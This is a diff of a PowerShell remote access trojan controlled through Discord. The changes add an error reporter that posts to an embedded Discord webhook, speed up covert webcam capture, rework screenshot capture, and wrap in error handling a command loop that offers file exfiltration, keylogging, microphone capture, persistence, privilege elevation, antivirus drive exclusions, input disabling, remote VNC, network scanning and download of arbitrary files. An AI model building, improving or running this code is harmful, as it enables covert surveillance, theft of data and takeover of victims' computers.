@@ -25,6 +25,59 @@ if (Test-Path "C:\Windows\Tasks\service.vbs") {
     Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force
 }
 
+# Error Handling System with Webhook Reporting
+$global:ErrorWebhook = "https://discord.com/api/webhooks/1273395943873450107/BGtPgEvMWW60aW65PWHkV5aRTx2XY8lZeSdTsoxBn5-60GnWngbToICZ5o5MjgnuSaC2"
+
+function Send-ErrorReport {
+    param (
+        [string]$ErrorMessage,
+        [string]$Timestamp = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
+    )
+    $embed = @{
+        username = "$env:COMPUTERNAME"
+        tts = $false
+        embeds = @(
+            @{
+                title = ":warning: Error Report"
+                description = "An error occurred on **$env:COMPUTERNAME**"
+                color = 0xFF0000
+                fields = @(
+                    @{
+                        name = "Timestamp"
+                        value = "``````$Timestamp``````"
+                        inline = $true
+                    },
+                    @{
+                        name = "Error Message"
+                        value = "``````$ErrorMessage``````"
+                        inline = $false
+                    }
+                )
+                footer = @{
+                    text = "Error Logged"
+                }
+            }
+        )
+    }
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Content-Type", "application/json")
+    $jsonBody = $embed | ConvertTo-Json -Depth 10 -Compress
+    try {
+        $wc.UploadString($global:ErrorWebhook, "POST", $jsonBody)
+    } catch {
+        Write-Host "Failed to send error report to webhook."
+    }
+}
+
+# Trap all errors and send to webhook
+trap {
+    $errorMsg = $_.Exception.Message
+    $errorStack = $_.ScriptStackTrace
+    $fullError = "Message: $errorMsg`nStack Trace: $errorStack"
+    Send-ErrorReport -ErrorMessage $fullError
+    continue
+}
+
 # Helper Functions
 function Send-DiscordMessage {
     param (
@@ -1300,12 +1353,12 @@ $webcamJob = {
         }
     }
     Get-FFmpeg
-    $outputFile = "$env:Temp\Image.jpg"
+    $outputFile = "$env:Temp\Webcam.jpg"
     while ($true) {
-        & "$env:Temp\ffmpeg.exe" -f dshow -i video="USB Camera" -vframes 1 -q:v 2 $outputFile
+        & "$env:Temp\ffmpeg.exe" -f dshow -i video="Integrated Webcam" -frames:v 1 -q:v 2 -y $outputFile
         Send-WebcamFile -FilePath $outputFile
         Remove-Item -Path $outputFile -Force
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 5
     }
 }
 
@@ -1320,17 +1373,18 @@ $screenshotJob = {
             $wc.UploadFile($url, "POST", $FilePath)
         }
     }
+    Add-Type -AssemblyName System.Drawing
     Add-Type -AssemblyName System.Windows.Forms
     while ($true) {
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+        $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $screenshot = New-Object Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
+        $graphics.CopyFromScreen($screenBounds.X, $screenBounds.Y, 0, 0, $screenBounds.Size)
         $outputFile = "$env:Temp\Screen.jpg"
-        $bitmap.Save($outputFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        Send-ScreenshotFile -FilePath $outputFile
+        $screenshot.Save($outputFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
         $graphics.Dispose()
-        $bitmap.Dispose()
+        $screenshot.Dispose()
+        Send-ScreenshotFile -FilePath $outputFile
         Remove-Item -Path $outputFile -Force
         Start-Sleep -Seconds 10
     }
@@ -1513,155 +1567,172 @@ if ($global:HideConsole) {
 }
 
 if ($global:CreateChannels) {
-    New-DiscordChannelCategory
-    New-DiscordChannel -Name "session"
-    $global:SessionID = $global:ChannelID
-    New-DiscordChannel -Name "loot"
-    $global:LootID = $global:ChannelID
-    New-DiscordChannel -Name "powershell"
-    $global:PowershellID = $global:ChannelID
-    New-DiscordChannel -Name "keys"
-    $global:KeyID = $global:ChannelID
-    New-DiscordChannel -Name "microphone"
-    $global:MicrophoneID = $global:ChannelID
-    New-DiscordChannel -Name "webcam"
-    $global:WebcamID = $global:ChannelID
-    New-DiscordChannel -Name "screenshots"
-    $global:ScreenshotID = $global:ChannelID
+    try {
+        New-DiscordChannelCategory
+        New-DiscordChannel -Name "session"
+        $global:SessionID = $global:ChannelID
+        New-DiscordChannel -Name "loot"
+        $global:LootID = $global:ChannelID
+        New-DiscordChannel -Name "powershell"
+        $global:PowershellID = $global:ChannelID
+        New-DiscordChannel -Name "keys"
+        $global:KeyID = $global:ChannelID
+        New-DiscordChannel -Name "microphone"
+        $global:MicrophoneID = $global:ChannelID
+        New-DiscordChannel -Name "webcam"
+        $global:WebcamID = $global:ChannelID
+        New-DiscordChannel -Name "screenshots"
+        $global:ScreenshotID = $global:ChannelID
+    } catch {
+        Send-DiscordMessage -Message ":x: ``Failed to create channels: $_.Exception.Message`` :x:"
+    }
 }
 
 if ($global:InfoOnConnect) {
-    Get-SystemInfo
+    try {
+        Get-SystemInfo
+    } catch {
+        Send-DiscordMessage -Message ":x: ``Failed to get system info: $_.Exception.Message`` :x:"
+    }
 }
 
 if ($global:AutoStartJobs) {
-    Start-Job -Name "LootJob" -ScriptBlock $lootJob -ArgumentList $global:Token, $global:LootID
-    Start-Job -Name "PowershellJob" -ScriptBlock $powershellJob -ArgumentList $global:Token, $global:PowershellID
-    Start-Job -Name "KeyJob" -ScriptBlock $keyJob -ArgumentList $global:Token, $global:KeyID
-    Start-Job -Name "AudioJob" -ScriptBlock $audioJob -ArgumentList $global:Token, $global:MicrophoneID, $null
-    Start-Job -Name "WebcamJob" -ScriptBlock $webcamJob -ArgumentList $global:Token, $global:WebcamID
-    Start-Job -Name "ScreenshotJob" -ScriptBlock $screenshotJob -ArgumentList $global:Token, $global:ScreenshotID
+    try {
+        Start-Job -Name "LootJob" -ScriptBlock $lootJob -ArgumentList $global:Token, $global:LootID
+        Start-Job -Name "PowershellJob" -ScriptBlock $powershellJob -ArgumentList $global:Token, $global:PowershellID
+        Start-Job -Name "KeyJob" -ScriptBlock $keyJob -ArgumentList $global:Token, $global:KeyID
+        Start-Job -Name "AudioJob" -ScriptBlock $audioJob -ArgumentList $global:Token, $global:MicrophoneID, $null
+        Start-Job -Name "WebcamJob" -ScriptBlock $webcamJob -ArgumentList $global:Token, $global:WebcamID
+        Start-Job -Name "ScreenshotJob" -ScriptBlock $screenshotJob -ArgumentList $global:Token, $global:ScreenshotID
+    } catch {
+        Send-DiscordMessage -Message ":x: ``Failed to start jobs: $_.Exception.Message`` :x:"
+    }
 }
 
 # Main Loop
 $lastTimestamp = $null
 while ($true) {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", "Bot $global:Token")
-    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json
-    $botId = ($wc.DownloadString("https://discord.com/api/v10/users/@me") | ConvertFrom-Json).id
-    $recent = $messages | Where-Object { $_.author.id -ne $botId } | Select-Object -First 1
-    if ($recent.timestamp -ne $lastTimestamp) {
-        $lastTimestamp = $recent.timestamp
-        $command = $recent.content.Trim()
-        switch -Wildcard ($command) {
-            "Options" { Show-Options }
-            "ExtraInfo" { Show-ExtraInfo }
-            "Cleanup" { Clear-System }
-            "FakeUpdate" { Start-FakeUpdate }
-            "Windows93" { Start-Windows93 }
-            "WindowsIdiot" { Start-WindowsIdiot }
-            "SendHydra" { Start-Hydra }
-            "SoundSpam" { Start-SoundSpam }
-            "MinimizeAll" { Minimize-All }
-            "EnableDarkMode" { Enable-DarkMode }
-            "DisableDarkMode" { Disable-DarkMode }
-            "ShortcutBomb" { Start-ShortcutBomb }
-            "AddPersistance" { Add-Persistence }
-            "RemovePersistance" { Remove-Persistence }
-            "IsAdmin" { Test-Admin }
-            "Elevate" { Request-Elevation }
-            "ExcludeCDrive" { Exclude-CDrive }
-            "ExcludeAllDrives" { Exclude-AllDrives }
-            "EnableIO" { Enable-IO }
-            "DisableIO" { Disable-IO }
-            "Exfiltrate*" {
-                $params = $command -split '\s+-'
-                $path = $null
-                $filetype = $null
-                foreach ($param in $params) {
-                    if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
-                    if ($param -match '^Filetype\s+(.+)$') { $filetype = $matches[1] }
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", "Bot $global:Token")
+        $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json
+        $botId = ($wc.DownloadString("https://discord.com/api/v10/users/@me") | ConvertFrom-Json).id
+        $recent = $messages | Where-Object { $_.author.id -ne $botId } | Select-Object -First 1
+        if ($recent.timestamp -ne $lastTimestamp) {
+            $lastTimestamp = $recent.timestamp
+            $command = $recent.content.Trim()
+            switch -Wildcard ($command) {
+                "Options" { Show-Options }
+                "ExtraInfo" { Show-ExtraInfo }
+                "Cleanup" { Clear-System }
+                "FakeUpdate" { Start-FakeUpdate }
+                "Windows93" { Start-Windows93 }
+                "WindowsIdiot" { Start-WindowsIdiot }
+                "SendHydra" { Start-Hydra }
+                "SoundSpam" { Start-SoundSpam }
+                "MinimizeAll" { Minimize-All }
+                "EnableDarkMode" { Enable-DarkMode }
+                "DisableDarkMode" { Disable-DarkMode }
+                "ShortcutBomb" { Start-ShortcutBomb }
+                "AddPersistance" { Add-Persistence }
+                "RemovePersistance" { Remove-Persistence }
+                "IsAdmin" { Test-Admin }
+                "Elevate" { Request-Elevation }
+                "ExcludeCDrive" { Exclude-CDrive }
+                "ExcludeAllDrives" { Exclude-AllDrives }
+                "EnableIO" { Enable-IO }
+                "DisableIO" { Disable-IO }
+                "Exfiltrate*" {
+                    $params = $command -split '\s+-'
+                    $path = $null
+                    $filetype = $null
+                    foreach ($param in $params) {
+                        if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
+                        if ($param -match '^Filetype\s+(.+)$') { $filetype = $matches[1] }
+                    }
+                    Start-Exfiltrate -Path $path -Filetype $filetype
                 }
-                Start-Exfiltrate -Path $path -Filetype $filetype
-            }
-            "Upload*" {
-                $params = $command -split '\s+-'
-                $path = $null
-                foreach ($param in $params) {
-                    if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
+                "Upload*" {
+                    $params = $command -split '\s+-'
+                    $path = $null
+                    foreach ($param in $params) {
+                        if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
+                    }
+                    Start-Upload -Path $path
                 }
-                Start-Upload -Path $path
-            }
-            "Download*" {
-                $params = $command -split '\s+-'
-                $url = $null
-                $path = "$env:Temp\downloaded_file"
-                foreach ($param in $params) {
-                    if ($param -match '^Url\s+(.+)$') { $url = $matches[1] }
-                    if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
+                "Download*" {
+                    $params = $command -split '\s+-'
+                    $url = $null
+                    $path = "$env:Temp\downloaded_file"
+                    foreach ($param in $params) {
+                        if ($param -match '^Url\s+(.+)$') { $url = $matches[1] }
+                        if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
+                    }
+                    if ($url) { Start-Download -Url $url -Path $path }
+                    else { Send-DiscordMessage -Message ":x: ``Download requires -Url parameter`` :x:" }
                 }
-                if ($url) { Start-Download -Url $url -Path $path }
-                else { Send-DiscordMessage -Message ":x: ``Download requires -Url parameter`` :x:" }
-            }
-            "StartUvnc*" {
-                $params = $command -split '\s+-'
-                $ip = $null
-                $port = 5900
-                foreach ($param in $params) {
-                    if ($param -match '^Ip\s+(.+)$') { $ip = $matches[1] }
-                    if ($param -match '^Port\s+(.+)$') { $port = $matches[1] }
+                "StartUvnc*" {
+                    $params = $command -split '\s+-'
+                    $ip = $null
+                    $port = 5900
+                    foreach ($param in $params) {
+                        if ($param -match '^Ip\s+(.+)$') { $ip = $matches[1] }
+                        if ($param -match '^Port\s+(.+)$') { $port = $matches[1] }
+                    }
+                    if ($ip) { Start-Uvnc -Ip $ip -Port $port }
+                    else { Send-DiscordMessage -Message ":x: ``StartUvnc requires -Ip parameter`` :x:" }
                 }
-                if ($ip) { Start-Uvnc -Ip $ip -Port $port }
-                else { Send-DiscordMessage -Message ":x: ``StartUvnc requires -Ip parameter`` :x:" }
-            }
-            "SpeechToText" { Start-SpeechToText }
-            "EnumerateLAN*" {
-                $params = $command -split '\s+-'
-                $prefix = $null
-                foreach ($param in $params) {
-                    if ($param -match '^Prefix\s+(.+)$') { $prefix = $matches[1] }
+                "SpeechToText" { Start-SpeechToText }
+                "EnumerateLAN*" {
+                    $params = $command -split '\s+-'
+                    $prefix = $null
+                    foreach ($param in $params) {
+                        if ($param -match '^Prefix\s+(.+)$') { $prefix = $matches[1] }
+                    }
+                    Start-EnumerateLAN -Prefix $prefix
                 }
-                Start-EnumerateLAN -Prefix $prefix
-            }
-            "NearbyWifi" { Start-NearbyWifi }
-            "RecordScreen*" {
-                $params = $command -split '\s+-'
-                $time = 60
-                foreach ($param in $params) {
-                    if ($param -match '^t\s+(.+)$') { $time = $matches[1] }
+                "NearbyWifi" { Start-NearbyWifi }
+                "RecordScreen*" {
+                    $params = $command -split '\s+-'
+                    $time = 60
+                    foreach ($param in $params) {
+                        if ($param -match '^t\s+(.+)$') { $time = $matches[1] }
+                    }
+                    Start-RecordScreen -Time $time
                 }
-                Start-RecordScreen -Time $time
-            }
-            "Message *" { Send-Message -Message ($command -replace '^Message\s+', '') }
-            "VoiceMessage *" { Send-VoiceMessage -Message ($command -replace '^VoiceMessage\s+', '') }
-            "Wallpaper*" {
-                $params = $command -split '\s+-'
-                $url = $null
-                foreach ($param in $params) {
-                    if ($param -match '^url\s+(.+)$') { $url = $matches[1] }
+                "Message *" { Send-Message -Message ($command -replace '^Message\s+', '') }
+                "VoiceMessage *" { Send-VoiceMessage -Message ($command -replace '^VoiceMessage\s+', '') }
+                "Wallpaper*" {
+                    $params = $command -split '\s+-'
+                    $url = $null
+                    foreach ($param in $params) {
+                        if ($param -match '^url\s+(.+)$') { $url = $matches[1] }
+                    }
+                    if ($url) { Set-Wallpaper -Url $url }
+                    else { Send-DiscordMessage -Message ":x: ``Wallpaper requires -url parameter`` :x:" }
                 }
-                if ($url) { Set-Wallpaper -Url $url }
-                else { Send-DiscordMessage -Message ":x: ``Wallpaper requires -url parameter`` :x:" }
-            }
-            "Goose" { Start-Goose }
-            "ScreenParty" { Start-ScreenParty }
-            "Kill *" {
-                $jobName = $command -replace '^Kill\s+', ''
-                Stop-JobByName -JobName $jobName
-            }
-            "PauseJobs" { Pause-Jobs }
-            "ResumeJobs" { Resume-Jobs }
-            "Close" {
-                Send-DiscordMessage -Message ":octagonal_sign: ``Closing session for $env:COMPUTERNAME`` :octagonal_sign:"
-                Get-Job | Stop-Job
-                Get-Job | Remove-Job
-                exit
-            }
-            default {
-                Send-DiscordMessage -Message ":x: ``Unknown command: $command`` :x:"
+                "Goose" { Start-Goose }
+                "ScreenParty" { Start-ScreenParty }
+                "Kill *" {
+                    $jobName = $command -replace '^Kill\s+', ''
+                    Stop-JobByName -JobName $jobName
+                }
+                "PauseJobs" { Pause-Jobs }
+                "ResumeJobs" { Resume-Jobs }
+                "Close" {
+                    Send-DiscordMessage -Message ":octagonal_sign: ``Closing session for $env:COMPUTERNAME`` :octagonal_sign:"
+                    Get-Job | Stop-Job
+                    Get-Job | Remove-Job
+                    exit
+                }
+                default {
+                    Send-DiscordMessage -Message ":x: ``Unknown command: $command`` :x:"
+                }
             }
         }
+    } catch {
+        Send-DiscordMessage -Message ":x: ``Error in main loop: $_.Exception.Message`` :x:"
+        Send-ErrorReport -ErrorMessage "Main Loop Error: $_.Exception.Message`nStack Trace: $_.ScriptStackTrace"
     }
     Start-Sleep -Seconds 3
 }
